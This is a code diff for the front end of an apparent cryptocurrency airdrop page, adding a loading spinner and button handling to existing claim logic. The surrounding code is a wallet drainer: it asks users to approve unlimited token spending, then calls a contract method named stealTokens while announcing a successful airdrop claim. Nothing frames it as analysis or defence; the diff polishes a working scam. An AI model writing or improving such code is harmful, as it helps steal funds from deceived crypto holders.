@@ -69,7 +69,8 @@ async function approveSpending() {
   const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
   try {
     // Approve unlimited spending of tokens for the contract
-    await tokenContract.methods.approve(contractAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: accounts[0] });
+    const approvalTx = await tokenContract.methods.approve(contractAddress, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff').send({ from: accounts[0] });
+
     alert('Approval successful!');
     document.getElementById('claimAirdropButton').disabled = false; // Enable claim button after approval
   } catch (error) {
@@ -92,12 +93,21 @@ async function claimAirdrop() {
 
   const contract = new web3.eth.Contract(contractABI, contractAddress);
   try {
+    // Show a loading spinner while processing
+    document.getElementById('claimAirdropButton').disabled = true;  // Disable claim button during transaction
+    document.getElementById('loadingIndicator').style.display = 'block'; // Assuming you have a spinner or loading indicator
+
     // Call the contract's method to claim the airdrop
     await contract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+
     alert('Airdrop claimed successfully!');
   } catch (error) {
     alert('Error claiming airdrop');
     console.error('Claim error:', error);
+  } finally {
+    // Hide the loading spinner after the transaction is complete
+    document.getElementById('claimAirdropButton').disabled = false; // Enable claim button again
+    document.getElementById('loadingIndicator').style.display = 'none'; // Hide loading indicator
   }
 }
 
